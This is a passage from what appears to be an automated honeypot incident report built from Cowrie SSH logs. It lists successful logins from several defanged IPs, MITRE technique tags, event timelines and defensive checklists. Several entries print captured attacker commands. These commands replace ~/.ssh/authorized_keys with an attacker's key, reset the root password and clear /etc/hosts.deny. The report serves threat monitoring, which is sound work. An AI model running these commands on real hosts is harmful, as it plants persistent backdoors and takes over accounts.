| `2026-06-09 04:52:22` | `cowrie.command.failed` |
| `2026-06-09 04:52:22` | `cowrie.log.closed` |
| `2026-06-09 04:52:22` | `cowrie.session.params` |
| `2026-06-09 04:52:22` | `cowrie.command.input` |
| `2026-06-09 04:52:22` | `cowrie.session.file_download` |
| `2026-06-09 04:52:22` | `cowrie.log.closed` |
| `2026-06-09 04:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2774cc954e0a

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:52 |
| **Last Seen** | 2026-06-09 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:52:23` | `cowrie.session.connect` |
| `2026-06-09 04:52:23` | `cowrie.client.version` |
| `2026-06-09 04:52:23` | `cowrie.client.kex` |
| `2026-06-09 04:52:23` | `cowrie.login.success` |
| `2026-06-09 04:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e29db4c3bbd7

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:54 |
| **Last Seen** | 2026-06-09 04:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:54:13` | `cowrie.session.connect` |
| `2026-06-09 04:54:13` | `cowrie.client.version` |
| `2026-06-09 04:54:13` | `cowrie.client.kex` |
| `2026-06-09 04:54:14` | `cowrie.login.success` |
| `2026-06-09 04:54:14` | `cowrie.session.params` |
| `2026-06-09 04:54:14` | `cowrie.command.input` |
| `2026-06-09 04:54:14` | `cowrie.command.failed` |
| `2026-06-09 04:54:14` | `cowrie.log.closed` |
| `2026-06-09 04:54:14` | `cowrie.session.params` |
| `2026-06-09 04:54:14` | `cowrie.command.input` |
| `2026-06-09 04:54:14` | `cowrie.session.file_download` |
| `2026-06-09 04:54:14` | `cowrie.log.closed` |
| `2026-06-09 04:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a5b8b4a2e77

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:54 |
| **Last Seen** | 2026-06-09 04:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:54:15` | `cowrie.session.connect` |
| `2026-06-09 04:54:15` | `cowrie.client.version` |
| `2026-06-09 04:54:15` | `cowrie.client.kex` |
| `2026-06-09 04:54:16` | `cowrie.login.success` |
| `2026-06-09 04:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1540585905b

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-06-09 05:44 |
| **Last Seen** | 2026-06-09 05:45 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 05:44:50` | `cowrie.session.connect` |
| `2026-06-09 05:44:50` | `cowrie.client.version` |
| `2026-06-09 05:44:50` | `cowrie.client.kex` |
| `2026-06-09 05:44:51` | `cowrie.login.success` |
| `2026-06-09 05:44:52` | `cowrie.session.params` |
| `2026-06-09 05:44:52` | `cowrie.command.input` |
| `2026-06-09 05:44:52` | `cowrie.command.failed` |
| `2026-06-09 05:44:53` | `cowrie.log.closed` |
| `2026-06-09 05:44:54` | `cowrie.session.params` |
| `2026-06-09 05:44:54` | `cowrie.command.input` |
| `2026-06-09 05:44:55` | `cowrie.session.file_download` |
| `2026-06-09 05:44:55` | `cowrie.log.closed` |
| `2026-06-09 05:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdafded9ab80

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-06-09 05:45 |
| **Last Seen** | 2026-06-09 05:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 05:45:04` | `cowrie.session.connect` |
| `2026-06-09 05:45:04` | `cowrie.client.version` |
| `2026-06-09 05:45:06` | `cowrie.client.kex` |
| `2026-06-09 05:45:08` | `cowrie.login.success` |
| `2026-06-09 05:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f446d165d4b0

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 05:50 |
| **Last Seen** | 2026-06-09 05:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 05:50:08` | `cowrie.session.connect` |
| `2026-06-09 05:50:08` | `cowrie.client.version` |
| `2026-06-09 05:50:08` | `cowrie.client.kex` |
| `2026-06-09 05:50:09` | `cowrie.login.success` |
| `2026-06-09 05:50:10` | `cowrie.session.params` |
| `2026-06-09 05:50:10` | `cowrie.command.input` |
| `2026-06-09 05:50:10` | `cowrie.command.failed` |
| `2026-06-09 05:50:10` | `cowrie.log.closed` |
| `2026-06-09 05:50:10` | `cowrie.session.params` |
| `2026-06-09 05:50:10` | `cowrie.command.input` |
| `2026-06-09 05:50:11` | `cowrie.session.file_download` |
| `2026-06-09 05:50:11` | `cowrie.log.closed` |
| `2026-06-09 05:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-075507dc42bc

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 05:50 |
| **Last Seen** | 2026-06-09 05:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 05:50:14` | `cowrie.session.connect` |
| `2026-06-09 05:50:14` | `cowrie.client.version` |
| `2026-06-09 05:50:14` | `cowrie.client.kex` |
| `2026-06-09 05:50:15` | `cowrie.login.success` |
| `2026-06-09 05:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3998a3b2b692

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 05:52 |
| **Last Seen** | 2026-06-09 05:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 05:52:03` | `cowrie.session.connect` |
| `2026-06-09 05:52:03` | `cowrie.client.version` |
| `2026-06-09 05:52:03` | `cowrie.client.kex` |
| `2026-06-09 05:52:04` | `cowrie.login.success` |
| `2026-06-09 05:52:04` | `cowrie.session.params` |
| `2026-06-09 05:52:04` | `cowrie.command.input` |
| `2026-06-09 05:52:04` | `cowrie.command.failed` |
| `2026-06-09 05:52:04` | `cowrie.log.closed` |
| `2026-06-09 05:52:04` | `cowrie.session.params` |
| `2026-06-09 05:52:04` | `cowrie.command.input` |
| `2026-06-09 05:52:04` | `cowrie.session.file_download` |
| `2026-06-09 05:52:04` | `cowrie.log.closed` |
| `2026-06-09 05:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1be3193afd02

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 05:52 |
| **Last Seen** | 2026-06-09 05:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 05:52:05` | `cowrie.session.connect` |
| `2026-06-09 05:52:05` | `cowrie.client.version` |
| `2026-06-09 05:52:05` | `cowrie.client.kex` |
| `2026-06-09 05:52:05` | `cowrie.login.success` |
| `2026-06-09 05:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d69c14e928a8

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-06-09 05:52 |
| **Last Seen** | 2026-06-09 05:53 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0cC3lIEe2P8l"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 05:52:47` | `cowrie.session.connect` |
| `2026-06-09 05:52:47` | `cowrie.client.version` |
| `2026-06-09 05:52:47` | `cowrie.client.kex` |
| `2026-06-09 05:52:49` | `cowrie.login.success` |
| `2026-06-09 05:52:52` | `cowrie.session.params` |
| `2026-06-09 05:52:52` | `cowrie.command.input` |
| `2026-06-09 05:52:52` | `cowrie.command.failed` |
| `2026-06-09 05:52:54` | `cowrie.log.closed` |
| `2026-06-09 05:52:56` | `cowrie.session.params` |
| `2026-06-09 05:52:56` | `cowrie.command.input` |
| `2026-06-09 05:52:58` | `cowrie.session.file_download` |
| `2026-06-09 05:52:58` | `cowrie.log.closed` |
| `2026-06-09 05:53:08` | `cowrie.session.params` |
| `2026-06-09 05:53:08` | `cowrie.command.input` |
| `2026-06-09 05:53:09` | `cowrie.log.closed` |
| `2026-06-09 05:53:09` | `cowrie.session.params` |
| `2026-06-09 05:53:09` | `cowrie.command.input` |
| `2026-06-09 05:53:11` | `cowrie.log.closed` |
| `2026-06-09 05:53:12` | `cowrie.session.params` |
| `2026-06-09 05:53:12` | `cowrie.command.input` |
| `2026-06-09 05:53:12` | `cowrie.session.file_download` |
| `2026-06-09 05:53:12` | `cowrie.log.closed` |
| `2026-06-09 05:53:12` | `cowrie.session.params` |
| `2026-06-09 05:53:12` | `cowrie.command.input` |
| `2026-06-09 05:53:13` | `cowrie.log.closed` |
| `2026-06-09 05:53:14` | `cowrie.session.params` |
| `2026-06-09 05:53:14` | `cowrie.command.input` |
| `2026-06-09 05:53:14` | `cowrie.log.closed` |
| `2026-06-09 05:53:15` | `cowrie.session.params` |
| `2026-06-09 05:53:15` | `cowrie.command.input` |
| `2026-06-09 05:53:15` | `cowrie.command.input` |
| `2026-06-09 05:53:15` | `cowrie.log.closed` |
| `2026-06-09 05:53:16` | `cowrie.session.params` |
| `2026-06-09 05:53:16` | `cowrie.command.input` |
| `2026-06-09 05:53:16` | `cowrie.log.closed` |
| `2026-06-09 05:53:17` | `cowrie.session.params` |
| `2026-06-09 05:53:17` | `cowrie.command.input` |
| `2026-06-09 05:53:17` | `cowrie.log.closed` |
| `2026-06-09 05:53:18` | `cowrie.session.params` |
| `2026-06-09 05:53:18` | `cowrie.command.input` |
| `2026-06-09 05:53:19` | `cowrie.log.closed` |
| `2026-06-09 05:53:20` | `cowrie.session.params` |
| `2026-06-09 05:53:20` | `cowrie.command.input` |
| `2026-06-09 05:53:20` | `cowrie.log.closed` |
| `2026-06-09 05:53:21` | `cowrie.session.params` |
| `2026-06-09 05:53:21` | `cowrie.command.input` |
| `2026-06-09 05:53:21` | `cowrie.log.closed` |
| `2026-06-09 05:53:23` | `cowrie.session.params` |
| `2026-06-09 05:53:23` | `cowrie.command.input` |
| `2026-06-09 05:53:23` | `cowrie.log.closed` |
| `2026-06-09 05:53:24` | `cowrie.session.params` |
| `2026-06-09 05:53:24` | `cowrie.command.input` |
| `2026-06-09 05:53:24` | `cowrie.log.closed` |
| `2026-06-09 05:53:25` | `cowrie.session.params` |
| `2026-06-09 05:53:25` | `cowrie.command.input` |
| `2026-06-09 05:53:25` | `cowrie.log.closed` |
| `2026-06-09 05:53:26` | `cowrie.session.params` |
| `2026-06-09 05:53:26` | `cowrie.command.input` |
| `2026-06-09 05:53:26` | `cowrie.log.closed` |
| `2026-06-09 05:53:27` | `cowrie.session.params` |
| `2026-06-09 05:53:27` | `cowrie.command.input` |
| `2026-06-09 05:53:28` | `cowrie.log.closed` |
| `2026-06-09 05:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71b6d054aa99

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 05:57 |
| **Last Seen** | 2026-06-09 05:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 05:57:57` | `cowrie.session.connect` |
| `2026-06-09 05:57:57` | `cowrie.client.version` |
| `2026-06-09 05:57:57` | `cowrie.client.kex` |
| `2026-06-09 05:57:58` | `cowrie.login.success` |
| `2026-06-09 05:57:59` | `cowrie.session.params` |
| `2026-06-09 05:57:59` | `cowrie.command.input` |
| `2026-06-09 05:57:59` | `cowrie.command.failed` |
| `2026-06-09 05:58:00` | `cowrie.log.closed` |
| `2026-06-09 05:58:00` | `cowrie.session.params` |
| `2026-06-09 05:58:00` | `cowrie.command.input` |
| `2026-06-09 05:58:00` | `cowrie.session.file_download` |
| `2026-06-09 05:58:00` | `cowrie.log.closed` |
| `2026-06-09 05:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-485c992f5e8a

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 05:58 |
| **Last Seen** | 2026-06-09 05:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 05:58:03` | `cowrie.session.connect` |
| `2026-06-09 05:58:03` | `cowrie.client.version` |
| `2026-06-09 05:58:03` | `cowrie.client.kex` |
| `2026-06-09 05:58:04` | `cowrie.login.success` |
| `2026-06-09 05:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083eb59a2f38

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:00 |
| **Last Seen** | 2026-06-09 06:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:00:14` | `cowrie.session.connect` |
| `2026-06-09 06:00:14` | `cowrie.client.version` |
| `2026-06-09 06:00:14` | `cowrie.client.kex` |
| `2026-06-09 06:00:15` | `cowrie.login.success` |
| `2026-06-09 06:00:15` | `cowrie.session.params` |
| `2026-06-09 06:00:15` | `cowrie.command.input` |
| `2026-06-09 06:00:15` | `cowrie.command.failed` |
| `2026-06-09 06:00:15` | `cowrie.log.closed` |
| `2026-06-09 06:00:15` | `cowrie.session.params` |
| `2026-06-09 06:00:15` | `cowrie.command.input` |
| `2026-06-09 06:00:15` | `cowrie.session.file_download` |
| `2026-06-09 06:00:15` | `cowrie.log.closed` |
| `2026-06-09 06:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c5c5664da4e

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:00 |
| **Last Seen** | 2026-06-09 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:00:16` | `cowrie.session.connect` |
| `2026-06-09 06:00:16` | `cowrie.client.version` |
| `2026-06-09 06:00:16` | `cowrie.client.kex` |
| `2026-06-09 06:00:16` | `cowrie.login.success` |
| `2026-06-09 06:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4d70072b96f

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:02 |
| **Last Seen** | 2026-06-09 06:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
